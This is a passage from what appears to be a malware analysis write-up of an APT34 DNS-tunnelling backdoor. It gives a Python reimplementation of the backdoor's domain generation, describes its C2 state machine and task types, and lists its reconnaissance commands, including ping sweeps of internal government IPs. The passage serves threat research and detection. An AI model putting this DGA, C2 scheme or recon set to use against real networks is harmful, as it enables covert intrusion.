                <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">MT</span><span class="p">[(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="bp">self</span><span class="p">.</span><span class="n">n</span><span class="p">]</span> <span class="o">&amp;</span> <span class="bp">self</span><span class="p">.</span><span class="n">lower_mask</span><span class="p">)</span>
            <span class="n">xA</span> <span class="o">=</span> <span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">%</span> <span class="mi">2</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">xA</span> <span class="o">=</span> <span class="n">xA</span> <span class="o">^</span> <span class="bp">self</span><span class="p">.</span><span class="n">a</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">MT</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">MT</span><span class="p">[(</span><span class="n">i</span> <span class="o">+</span> <span class="bp">self</span><span class="p">.</span><span class="n">m</span><span class="p">)</span> <span class="o">%</span> <span class="bp">self</span><span class="p">.</span><span class="n">n</span><span class="p">]</span> <span class="o">^</span> <span class="n">xA</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>

    <span class="k">def</span> <span class="nf">extract_number</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
     
        <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">index</span> <span class="o">&gt;=</span> <span class="bp">self</span><span class="p">.</span><span class="n">n</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">twist</span><span class="p">()</span>

        <span class="n">y</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">MT</span><span class="p">[</span><span class="bp">self</span><span class="p">.</span><span class="n">index</span><span class="p">]</span>
        <span class="n">y</span> <span class="o">=</span> <span class="n">y</span> <span class="o">^</span> <span class="p">((</span><span class="n">y</span> <span class="o">&gt;&gt;</span> <span class="bp">self</span><span class="p">.</span><span class="n">u</span><span class="p">)</span> <span class="o">&amp;</span> <span class="bp">self</span><span class="p">.</span><span class="n">d</span><span class="p">)</span>
        <span class="n">y</span> <span class="o">=</span> <span class="n">y</span> <span class="o">^</span> <span class="p">((</span><span class="n">y</span> <span class="o">&lt;&lt;</span> <span class="bp">self</span><span class="p">.</span><span class="n">s</span><span class="p">)</span> <span class="o">&amp;</span> <span class="bp">self</span><span class="p">.</span><span class="n">b</span><span class="p">)</span>
        <span class="n">y</span> <span class="o">=</span> <span class="n">y</span> <span class="o">^</span> <span class="p">((</span><span class="n">y</span> <span class="o">&lt;&lt;</span> <span class="bp">self</span><span class="p">.</span><span class="n">t</span><span class="p">)</span> <span class="o">&amp;</span> <span class="bp">self</span><span class="p">.</span><span class="n">c</span><span class="p">)</span>
        <span class="n">y</span> <span class="o">=</span> <span class="n">y</span> <span class="o">^</span> <span class="p">(</span><span class="n">y</span> <span class="o">&gt;&gt;</span> <span class="bp">self</span><span class="p">.</span><span class="n">l</span><span class="p">)</span>

        <span class="bp">self</span><span class="p">.</span><span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">return</span> <span class="n">y</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>

    <span class="k">def</span> <span class="nf">GetRandomRange</span><span class="p">(</span><span class="bp">self</span> <span class="p">,</span> <span class="n">minn</span> <span class="p">,</span> <span class="n">maxx</span><span class="p">):</span>
        <span class="n">num</span> <span class="o">=</span> <span class="n">maxx</span> <span class="o">-</span> <span class="n">minn</span>
        <span class="n">randnum</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">extract_number</span><span class="p">()</span>
        <span class="k">return</span> <span class="n">minn</span> <span class="o">+</span> <span class="p">(</span><span class="n">randnum</span> <span class="o">%</span> <span class="n">num</span><span class="p">)</span>



<span class="k">def</span> <span class="nf">ConvertIntToDomain</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
    <span class="n">text</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">CharsDomain</span><span class="p">)</span>
    <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">text</span> <span class="o">=</span> <span class="n">CharsDomain</span><span class="p">[</span><span class="n">value</span> <span class="o">%</span> <span class="n">length</span><span class="p">]</span> <span class="o">+</span> <span class="n">text</span> 
        <span class="n">value</span> <span class="o">//=</span> <span class="n">length</span>
        <span class="k">if</span> <span class="n">value</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">break</span>

    <span class="k">return</span> <span class="n">text</span>
    
<span class="k">def</span> <span class="nf">PadLeft</span><span class="p">(</span><span class="n">text</span><span class="p">,</span><span class="n">totalWidth</span><span class="p">,</span><span class="n">paddingChar</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">totalWidth</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">text</span>
    <span class="k">return</span> <span class="n">paddingChar</span><span class="o">*</span><span class="p">(</span><span class="n">totalWidth</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">text</span><span class="p">))</span> <span class="o">+</span> <span class="n">text</span>
    

<span class="k">def</span> <span class="nf">ConvertIntToCounter</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
    <span class="n">text</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">CharsCounter</span><span class="p">)</span>
    <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">text</span> <span class="o">=</span> <span class="n">CharsCounter</span><span class="p">[</span><span class="n">value</span> <span class="o">%</span> <span class="n">length</span><span class="p">]</span> <span class="o">+</span> <span class="n">text</span> 
        <span class="n">value</span> <span class="o">//=</span> <span class="n">length</span>
        <span class="k">if</span> <span class="n">value</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">break</span>

    <span class="k">return</span> <span class="n">text</span>
    

<span class="k">def</span> <span class="nf">MapBaseSubdomainCharacters</span><span class="p">(</span> <span class="n">data</span><span class="p">,</span>  <span class="n">shuffle</span><span class="p">):</span>
       <span class="n">text</span> <span class="o">=</span> <span class="s">""</span>
       <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
            <span class="n">text</span> <span class="o">+=</span> <span class="n">shuffle</span><span class="p">[</span><span class="n">CharsDomain</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">])];</span>
       <span class="k">return</span> <span class="n">text</span>
       
       
<span class="k">def</span> <span class="nf">Shuffle</span><span class="p">(</span><span class="n">seed</span><span class="p">):</span>
    <span class="n">CharsDomain</span> <span class="o">=</span> <span class="s">"abcdefghijklmnopqrstuvwxyz0123456789"</span>
    <span class="n">randomMersenneTwister</span> <span class="o">=</span> <span class="n">RandomMersenneTwister</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">CharsDomain</span><span class="p">)</span>
    <span class="n">text2</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
                    <span class="n">randomRange</span> <span class="o">=</span> <span class="n">randomMersenneTwister</span><span class="p">.</span><span class="n">GetRandomRange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">CharsDomain</span><span class="p">))</span>
                    <span class="n">text2</span> <span class="o">+=</span> <span class="n">CharsDomain</span><span class="p">[</span><span class="n">randomRange</span><span class="p">];</span>
                    <span class="n">CharsDomain</span> <span class="o">=</span> <span class="n">CharsDomain</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="n">CharsDomain</span><span class="p">[</span><span class="n">randomRange</span><span class="p">],</span><span class="s">''</span><span class="p">)</span>
                
    <span class="k">return</span> <span class="n">text2</span>

</code></pre></div></div>

<h2 id="domain-generation">Domain Generation</h2>

<p>The <code class="language-plaintext highlighter-rouge">DomainMaker</code> uses a pseudorandom number generator and other functions seen in the above code .I wont discusses them since the implementation is clear and easy to understand .</p>

<p>Since our state is <code class="language-plaintext highlighter-rouge">Alive</code> and we are trying to generate its subdomain , once a subdomain  is generated, the malware randomly chooses one of three domains to concatenate with <code class="language-plaintext highlighter-rouge">joexpediagroup[.]com, asiaworldremit[.]com, or uber-asia[.]com</code>.</p>

<p>Steps for generating subdomains :</p>

<ol>
  <li>Convert DomainType which is int to character and append data passed to it which is <code class="language-plaintext highlighter-rouge">haruto</code>.</li>
  <li>Use the counter that was randomly generated  as a seed to MersenneTwister to generate random numbers and return 36 random char and numbers.</li>
  <li>Map step 1 output to the shuffled chars .</li>
  <li>Convert seed ( counter ) to char and pad it with the first char in <code class="language-plaintext highlighter-rouge">CharCounter</code>.</li>
  <li>Then append a random domain from the 3 that exists  <code class="language-plaintext highlighter-rouge">joexpediagroup.com</code>, <code class="language-plaintext highlighter-rouge">asiaworldremit.com</code>, <code class="language-plaintext highlighter-rouge">uber-asia.com</code>.</li>
  <li>Generated domain = step 3 output + step 4 output + step 5 output</li>
  <li>The counter is increased  if the malware was successfully connected to the generated domain .</li>
</ol>

<p><a href="/assets/Malware-Analysis/Apt34/7.PNG"><img src="/assets/Malware-Analysis/Apt34/7.PNG" alt="7.PNG" /></a></p>

<p><a href="/assets/Malware-Analysis/Apt34/8.PNG"><img src="/assets/Malware-Analysis/Apt34/8.PNG" alt="8.PNG" /></a></p>

<p>As example let the counter (seed) be 6537 , we can see the generated subdomain in the following snippet:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">seed</span> <span class="o">=</span> <span class="mi">6537</span> 
<span class="n">FirstAliveKey</span> <span class="o">=</span> <span class="s">"haruto"</span>
<span class="n">shuffle</span>  <span class="o">=</span> <span class="n">Shuffle</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
<span class="n">domain</span> <span class="o">=</span> <span class="n">ConvertIntToDomain</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">FirstAliveKey</span>
<span class="n">Domain</span> <span class="o">=</span> <span class="n">MapBaseSubdomainCharacters</span><span class="p">(</span><span class="n">domain</span><span class="p">,</span> <span class="n">shuffle</span><span class="p">)</span> <span class="o">+</span> <span class="n">PadLeft</span><span class="p">(</span><span class="n">ConvertIntToCounter</span><span class="p">(</span><span class="n">seed</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="n">CharsCounter</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="s">"."</span>
<span class="k">print</span><span class="p">(</span><span class="n">Domain</span> <span class="o">+</span> <span class="s">" [ joexpediagroup.com | asiaworldremit.com  | uber-asia.com ]"</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>qtqbkz1gay. [ joexpediagroup.com | asiaworldremit.com  |uber-asia.com ]
</code></pre></div></div>

<p>If the malware successfully got the IP of the domain generated , it sets the last octet of the address in  <code class="language-plaintext highlighter-rouge">AgentId</code>  ex: 
if the IP address is 127.0.0.1 so the <code class="language-plaintext highlighter-rouge">AgentId</code> will be 1 , which will be used in <code class="language-plaintext highlighter-rouge">DomainMaker</code> for other states.
Back to <code class="language-plaintext highlighter-rouge">Alive</code> function , if it was successfully connected to the generated domain and <code class="language-plaintext highlighter-rouge">AgentId</code> is set , it calls <code class="language-plaintext highlighter-rouge">MainAlive</code>.
We can enumerate all possible subdomains to be generated from <code class="language-plaintext highlighter-rouge">FirstAlive</code> by enumerating  all possible seeds until 46656 ( max counter).</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">seed</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">46656</span><span class="p">):</span>
    <span class="n">FirstAliveKey</span> <span class="o">=</span> <span class="s">"haruto"</span>
    <span class="n">shuffle</span>  <span class="o">=</span> <span class="n">Shuffle</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span> 
    <span class="n">domain</span> <span class="o">=</span> <span class="n">ConvertIntToDomain</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">FirstAliveKey</span>
    <span class="n">Domain</span> <span class="o">=</span> <span class="n">MapBaseSubdomainCharacters</span><span class="p">(</span><span class="n">domain</span><span class="p">,</span> <span class="n">shuffle</span><span class="p">)</span> <span class="o">+</span> <span class="n">PadLeft</span><span class="p">(</span><span class="n">ConvertIntToCounter</span><span class="p">(</span><span class="n">seed</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="n">CharsCounter</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="s">"."</span>
    <span class="k">print</span><span class="p">(</span><span class="n">Domain</span> <span class="o">+</span> <span class="s">" [ joexpediagroup.com | asiaworldremit.com  | uber-asia.com ]"</span><span class="p">)</span>

</code></pre></div></div>

<h2 id="quick-recap">Quick Recap</h2>
<p>Before we continue our analysis lets recap what already happened and put those pieces together .</p>
<ol>
  <li>Mutex created .</li>
  <li>Machine States dictionary create which control the states transaction , and every state do different job .</li>
  <li>Config intialized .</li>
  <li>First state is <code class="language-plaintext highlighter-rouge">Begin</code> and a command <code class="language-plaintext highlighter-rouge">Start </code>changes state to <code class="language-plaintext highlighter-rouge">Alive</code>.</li>
  <li>Try to call <code class="language-plaintext highlighter-rouge">FirstAlive</code> untill it succeed or exceed maximum tries.</li>
  <li><code class="language-plaintext highlighter-rouge">FirstAlive</code> generate subdomain as discussed above .</li>
  <li><code class="language-plaintext highlighter-rouge">MainAlive</code> is called .</li>
</ol>

<p>Let’s dig into <code class="language-plaintext highlighter-rouge">MainAlive</code> state .</p>

<h2 id="mainalive-state">MainAlive State</h2>
<p>The malware generate different subdomains constructed with the following steps:</p>

<ol>
  <li>Convert <code class="language-plaintext highlighter-rouge">AgentId</code>  to character .</li>
  <li>Use the counter that was randomly generated  as a seed to MersenneTwister to generate random numbers  and return 36 random char and numbers.</li>
  <li>Map step 1 output to the shuffled chars .</li>
  <li>Convert seed ( counter ) to char  and pad it with the first char in <code class="language-plaintext highlighter-rouge">CharCounter</code>.</li>
  <li>Then append a random domain from the 3 that exists <code class="language-plaintext highlighter-rouge">joexpediagroup.com</code> , <code class="language-plaintext highlighter-rouge">asiaworldremit.com</code> , <code class="language-plaintext highlighter-rouge">uber-asia.com</code>.</li>
  <li>Generated domain = step 3 output + step 4 output + step 5 output .</li>
  <li>The counter is increased if the malware was successfully connected to the generated domain .</li>
</ol>

<p><a href="/assets/Malware-Analysis/Apt34/18.PNG"><img src="/assets/Malware-Analysis/Apt34/18.PNG" alt="18.PNG" /></a></p>

<p>As example let the <code class="language-plaintext highlighter-rouge">AgentID</code> be 203 , we can see the generated subdomain in the following snippet:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">seed</span> <span class="o">=</span> <span class="mi">6538</span> 
<span class="n">agent_id</span>  <span class="o">=</span> <span class="mi">203</span>
<span class="n">shuffle</span>  <span class="o">=</span> <span class="n">Shuffle</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span> 
<span class="n">domain</span>  <span class="o">=</span> <span class="n">ConvertIntToDomain</span><span class="p">(</span><span class="n">agent_id</span><span class="p">)</span>
<span class="n">Domain</span> <span class="o">=</span> <span class="n">MapBaseSubdomainCharacters</span><span class="p">(</span><span class="n">domain</span><span class="p">,</span> <span class="n">shuffle</span><span class="p">)</span> <span class="o">+</span> <span class="n">PadLeft</span><span class="p">(</span><span class="n">ConvertIntToCounter</span><span class="p">(</span><span class="n">seed</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="n">CharsCounter</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="s">"."</span>
<span class="k">print</span><span class="p">(</span><span class="n">Domain</span> <span class="o">+</span> <span class="s">" [ joexpediagroup.com | asiaworldremit.com  | uber-asia.com ]"</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>6agaq. [ joexpediagroup.com | asiaworldremit.com  | uber-asia.com ]
</code></pre></div></div>

<p>When DNS is queried for a domain, a DNS server returns an IP address that points to the requested domain.
The malware then checks the first octet of the IP address to ensure the value is at least 128 to be considered valid. Perhaps this is a way for the malware to avoid internal IP addresses.</p>

<p>If the first octet value is at least 128 to , then initialize the data size that will be received  by taking the  last 3 octet s and that will be the size.
ex : if the IP address is 129.90.100.200 then the size would be :<code class="language-plaintext highlighter-rouge">0x5a64c8</code></p>

<p><a href="/assets/Malware-Analysis/Apt34/19.PNG"><img src="/assets/Malware-Analysis/Apt34/19.PNG" alt="19.PNG" /></a></p>

<p>If successfully connected to the generated domain and first octet of the IP is at least 128 then the <code class="language-plaintext highlighter-rouge">MachineState</code> will go to <code class="language-plaintext highlighter-rouge">Receive</code> state.</p>

<p>We can enumerate all possible domain to be generated from <code class="language-plaintext highlighter-rouge">MainAlive</code> state <code class="language-plaintext highlighter-rouge">11897280 possible domain</code> by enumerating the  all possible seeds until 46656 and <code class="language-plaintext highlighter-rouge">AgentId</code> until 255.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">seed</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">46656</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">agent_id</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">255</span><span class="p">):</span>
        <span class="n">shuffle</span>  <span class="o">=</span> <span class="n">Shuffle</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span> 
        <span class="n">domain</span>  <span class="o">=</span> <span class="n">ConvertIntToDomain</span><span class="p">(</span><span class="n">agent_id</span><span class="p">)</span>
        <span class="n">Domain</span> <span class="o">=</span> <span class="n">MapBaseSubdomainCharacters</span><span class="p">(</span><span class="n">domain</span><span class="p">,</span> <span class="n">shuffle</span><span class="p">)</span> <span class="o">+</span> <span class="n">PadLeft</span><span class="p">(</span><span class="n">ConvertIntToCounter</span><span class="p">(</span><span class="n">seed</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="n">CharsCounter</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="s">"."</span>
        <span class="k">print</span><span class="p">(</span><span class="n">Domain</span> <span class="o">+</span> <span class="s">" [ joexpediagroup.com | asiaworldremit.com  | uber-asia.com ]"</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="receive-state">Receive State</h2>
<p>This state fetches the C2 server, expecting to receive a command.</p>

<p>The malware generate different subdomains constructed with the following steps:</p>

<ol>
  <li>Passed data =  converted <code class="language-plaintext highlighter-rouge">RecieveByteIndex</code> to char padded with the first char in <code class="language-plaintext highlighter-rouge">CharDomain</code>.</li>
  <li>Convert domaintype to character and + the converted <code class="language-plaintext highlighter-rouge">AgentId</code> to character + data passed.</li>
  <li>Use the counter that was randomly generated  as a seed to MersenneTwister to genrate random numbers  and return 36 random char and numbers.</li>
  <li>Map step 1 to the shuffled chars .</li>
  <li>Convert seed ( counter ) to char  and pad it with the first char in <code class="language-plaintext highlighter-rouge">CharCounter</code>.</li>
  <li>Then append a random domain from the 3 that exists <code class="language-plaintext highlighter-rouge">joexpediagroup.com</code>, <code class="language-plaintext highlighter-rouge">asiaworldremit.com</code>, <code class="language-plaintext highlighter-rouge">uber-asia.com</code>.</li>
  <li>Generated domain = step 4 output + step 5 output + step 6 output</li>
  <li>The counter is increased if the malware was successfully connected to the generated domain .</li>
</ol>

<p><a href="/assets/Malware-Analysis/Apt34/30.PNG"><img src="/assets/Malware-Analysis/Apt34/30.PNG" alt="30.PNG" /></a></p>

<p><a href="/assets/Malware-Analysis/Apt34/20.PNG"><img src="/assets/Malware-Analysis/Apt34/20.PNG" alt="20.PNG" /></a></p>

<p>Here is how the domain is generated :</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">seed</span> <span class="o">=</span> <span class="mi">6539</span> 
<span class="n">AgentID</span>  <span class="o">=</span> <span class="mi">203</span>
<span class="n">domainType</span> <span class="o">=</span> <span class="mi">2</span> 
<span class="n">ReceiveByteIndex</span> <span class="o">=</span> <span class="mi">0</span> 
<span class="n">data</span> <span class="o">=</span>  <span class="n">PadLeft</span><span class="p">(</span><span class="n">ConvertIntToDomain</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="n">CharsDomain</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
<span class="n">shuffle</span>  <span class="o">=</span> <span class="n">Shuffle</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span> 
<span class="n">domain</span> <span class="o">=</span> <span class="n">ConvertIntToDomain</span><span class="p">(</span><span class="n">domainType</span><span class="p">)</span> <span class="o">+</span> <span class="n">ConvertIntToDomain</span><span class="p">(</span><span class="n">AgentID</span><span class="p">)</span> <span class="o">+</span> <span class="n">data</span>
<span class="n">Domain</span> <span class="o">=</span> <span class="n">MapBaseSubdomainCharacters</span><span class="p">(</span><span class="n">domain</span><span class="p">,</span> <span class="n">shuffle</span><span class="p">)</span> <span class="o">+</span> <span class="n">PadLeft</span><span class="p">(</span><span class="n">ConvertIntToCounter</span><span class="p">(</span><span class="n">seed</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="n">CharsCounter</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="s">"."</span>
<span class="k">print</span><span class="p">(</span><span class="n">Domain</span> <span class="o">+</span> <span class="s">" [ joexpediagroup.com | asiaworldremit.com  | uber-asia.com ]"</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aq3888gai. [ joexpediagroup.com | asiaworldremit.com  | uber-asia.com ]
</code></pre></div></div>

<p>If successfully connected to the generated domain , the malware start processing the received  data by converting the IP address to byte array and add it <code class="language-plaintext highlighter-rouge">ListData</code>. 
Since the max number of bytes could be received from one connection is 4. so multiple connections needed if more than 4 bytes would be received .
The first octet will be task type and the rest will be the command only if the <code class="language-plaintext highlighter-rouge">Received Size</code> is 4. If it’s more than that, the first octet of the first IP address of the generated domain will be the task type and IP addresses from the other generated domains will just be appended to it .
After all data have been received the malware move to new state <code class="language-plaintext highlighter-rouge">Do</code>.</p>

<p><a href="/assets/Malware-Analysis/Apt34/21.PNG"><img src="/assets/Malware-Analysis/Apt34/21.PNG" alt="21.PNG" /></a></p>

<h2 id="do-state">Do State</h2>

<p>As we can see <code class="language-plaintext highlighter-rouge">tasktype</code> was assigned the first octet  and the others octets assigned to <code class="language-plaintext highlighter-rouge">array2</code>, we have 5 task types .
so it might write a file on disk , if data was compressed then it will be decompressed then written to the file. The malware can although execute a built in command or other commands sent by the C2.
If a file is going to be written then a path  should be specified ,so the path of the file will be the bytes of <code class="language-plaintext highlighter-rouge">array2</code> from beginning until it match a <code class="language-plaintext highlighter-rouge">|</code> char , and the other bytes are the file content .</p>

<p><a href="/assets/Malware-Analysis/Apt34/23.PNG"><img src="/assets/Malware-Analysis/Apt34/23.PNG" alt="23.PNG" /></a></p>

<p>Task types :</p>

<table>
  <thead>
    <tr>
      <th>TaskType</th>
      <th>Values</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Enums.TaskType Static</td>
      <td>43</td>
    </tr>
    <tr>
      <td>Enums.TaskType Cmd</td>
      <td>70</td>
    </tr>
    <tr>
      <td>Enums.TaskType CompressedCmd</td>
      <td>71</td>
    </tr>
    <tr>
      <td>Enums.TaskType File</td>
      <td>95</td>
    </tr>
    <tr>
      <td>Enums.TaskType CompressedFile</td>
      <td>96</td>
    </tr>
  </tbody>
</table>

<p>If the malware going to execute one of the built in commands , an interesting non-cryptographic hashing function (FNV-1a) computes the command number , actually it just related to performance and C# compiler and not how the malware operate .</p>

<p><a href="/assets/Malware-Analysis/Apt34/24.PNG"><img src="/assets/Malware-Analysis/Apt34/24.PNG" alt="24.PNG" /></a></p>

<h2 id="built-in-commands">Built in Commands</h2>

<p>Some of commands are common reconnaissance but some of them are not that common. Some of the commands contain internal IPs and also internal domain names . That indicates that the actor has some previous knowledge about the internal infrastructure of the Organization .
These commands are executed through PowerShell or through CMD .</p>

<table>
  <tr>
    <th>Command Number</th>
    <th>Interpreter</th>
    <th>Payload</th>
    <th>Impact</th>
  </tr>
  <tr>
    <td>1</td>
    <td>PowerShell</td>
    <td>Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddresss</td>
    <td>Gets IP address for all IPv4 addresses on the computer.</td>
  </tr>
  <tr>
    <td>2</td>
    <td>PowerShell</td>
    <td> Get-NetNeighbor -AddressFamily IPv4 | Select-Object IPADDress</td>
      <td>Gets information about the neighbor cache for IPv4  , Gets neighbor cache information only about a specific neighbor IP address.</td>
  </tr>
    <tr>
    <td>3</td>
    <td>CMD</td>
    <td> whoami</td>
        <td>Display the domain and user name of the person who is currently logged on to this computer</td>
  </tr>
    <tr>
    <td>4</td>
    <td>PowerShell</td>
    <td> [System.Environment]::OSVersion.VersionString</td>
        <td>OS veriosn</td>
  </tr>
   <tr>
    <td>5</td>
    <td>CMD</td>
    <td> net user</td>
       <td>List of every user account, active or not, on the computer you're currently using.</td>
  </tr>
    <tr>
    <td> 7</td>
    <td>PowerShell</td>
    <td> Get-ChildItem -Path "C:\Program Files" | Select-Object Name</td>
        <td>List folders under C:\Program Files  installed  programes</td>
  </tr>
    <tr>
    <td>8</td>
    <td>PowerShell</td>
    <td> Get-ChildItem -Path 'C:\Program Files (x86)' | Select-Object Name</td>
        <td>List folders under C:\Program Files (x86) installed programes</td>
  </tr>
      <tr>
    <td>9</td>
    <td>PowerShell</td>
    <td>Get-ChildItem -Path 'C:' | Select-Object Name</td>
          <td>List folders under C </td>
  </tr>
  <tr>
    <td>10</td>
    <td>CMD</td>
    <td> hostname</td>
      <td>Display the name of the computer</td>
  </tr>
    <tr>
    <td>11</td>
    <td>PowerShell</td>
    <td> 
    Get-NetTCPConnection | Where-Object {$_.State -eq "Established"} | Select-Object "LocalAddress", "LocalPort", "RemoteAddress", "RemotePort"
    </td>
    <td>Gets all TCP connections that have an Established state.</td>
    
  </tr>
    <tr>
    <td>12</td>
    <td>PowerShell</td>
    <td>$(ping -n 1 10.65.4.50 | findstr /i ttl) -eq $null; $(ping -n 1 10.65.4.51 | findstr /i ttl) -eq $null; $(ping -n 1 10.65.65.65 | findstr /i ttl) -eq  $null; $(ping -n 1 10.65.53.53 | findstr /i ttl) -eq $null;$(ping -n 1 10.65.21.200 | findstr /i ttl) -eq $null

</td>
    <td>Checking if these internal IPs are alive</td>
  </tr>
    <tr>
    <td>13</td>
    <td>PowerShell</td>
    <td>  nslookup ise-posture.mofagov.gover.local | findstr /i Address;nslookup webmail.gov.jo | findstr /i Address</td>
    <td>Get IP Address of the domains  ise-posture.mofagov.gover.local and nslookup webmail.gov.jo</td>
  </tr>
    <tr>
    <td>14</td>
    <td>PowerShell</td>
    <td> $(ping -n 1 10.10.21.201 | findstr /i ttl) -eq $null;$(ping -n 1 10.10.19.201 | findstr /i ttl) -eq $null;$(ping -n 1 10.10.19.202 | findstr /i ttl) -eq $null;$(ping -n 1 10.10.24.200 | findstr /i ttl) -eq $null</td>
    <td>Checking if these internal IPs are alive</td>
  </tr>
    <tr>
    <td>15</td>
    <td>PowerShell</td>
    <td>  $(ping -n 1 10.10.10.4 | findstr /i ttl) -eq  $null; $(ping -n 1 10.10.50.10 | findstr /i ttl) -eq  $null; $(ping -n 1 10.10.22.50 | findstr /i ttl) -eq  $null; $(ping -n 1 10.10.45.19 | findstr /i ttl) -eq  $null</td>
    <td>Checking if these internal IPs are alive</td>
  </tr>
    <tr>
    <td>16</td>
    <td>PowerShell</td>
    <td> $(ping -n 1 10.65.51.11 | findstr /i ttl) -eq $null;$(ping -n 1 10.65.6.1 | findstr /i ttl) -eq $null;$(ping -n 1 10.65.52.200 | findstr /i ttl) -eq $null;$(ping -n 1 10.65.6.3 | findstr /i ttl) -eq $null</td>
    <td>Checking if these internal IPs are alive</td>
  </tr>
  <tr>
    <td>17</td>
    <td>PowerShell</td>
    <td>   $(ping -n 1 10.65.45.18 | findstr /i ttl) -eq  $null; $(ping -n 1 10.65.28.41 | findstr /i ttl) -eq  $null; $(ping -n 1 10.65.36.13 | findstr /i ttl) -eq  $null; $(ping -n 1 10.65.51.10 | findstr /i ttl) -eq $null</td>
    <td>Checking if these internal IPs are alive</td>
  </tr>
  <tr>
    <td>18</td>
    <td>PowerShell</td>
    <td>  $(ping -n 1 10.10.22.42 | findstr /i ttl) -eq $null;$(ping -n 1 10.10.23.200 | findstr /i ttl) -eq $null;$(ping -n 1 10.10.45.19 | findstr /i ttl) -eq $null;$(ping -n 1 10.10.19.50 | findstr /i ttl) -eq $null</td>
    <td>Checking if these internal IPs are alive</td>
  </tr>
  <tr>
    <td>19</td>
    <td>PowerShell</td>
